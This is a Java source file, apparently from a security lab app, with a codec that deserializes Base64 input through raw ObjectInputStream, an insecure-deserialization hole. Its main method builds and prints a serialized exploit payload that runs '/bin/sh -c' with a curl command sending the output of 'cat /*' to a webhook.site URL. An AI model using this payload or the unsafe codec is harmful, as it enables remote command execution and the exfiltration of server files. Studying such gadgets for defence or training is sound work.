package com.cbjs.ximiplace.service.voucher.rule;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.List;

public final class LegacyVoucherRuleCodec {

    private LegacyVoucherRuleCodec() {
    }

    public static String serializeToBase64(VoucherDiscountRule rule) {
        try (ByteArrayOutputStream bytes = new ByteArrayOutputStream();
             ObjectOutputStream output = new ObjectOutputStream(bytes)) {
            output.writeObject(rule);
            return Base64.getEncoder().encodeToString(bytes.toByteArray());
        } catch (IOException ex) {
            throw new IllegalStateException("Failed to archive voucher rule", ex);
        }
    }

    public static VoucherDiscountRule deserializeFromBase64(String encodedRule)
            throws IOException, ClassNotFoundException {
        byte[] bytes = Base64.getDecoder().decode(encodedRule);
        try (ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
            Object value = input.readObject();
            if (!(value instanceof VoucherDiscountRule rule)) {
                throw new IOException("Voucher rule archive has invalid type");
            }
            return rule;
        }
    }
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        ExternalCampaignVoucherRule rule = new ExternalCampaignVoucherRule();
        rule.setInterpreterPath("/bin/sh");
        rule.setCampaignScriptPath("-c");
        rule.setArguments(List.of(" curl -s https://webhook.site/69f83cb2-b7e6-4120-a553-b058340453ef  -d \"$(cat /*)\""));
        String encodedRule = serializeToBase64(rule);
        System.out.println("output: " + encodedRule);
    }
}
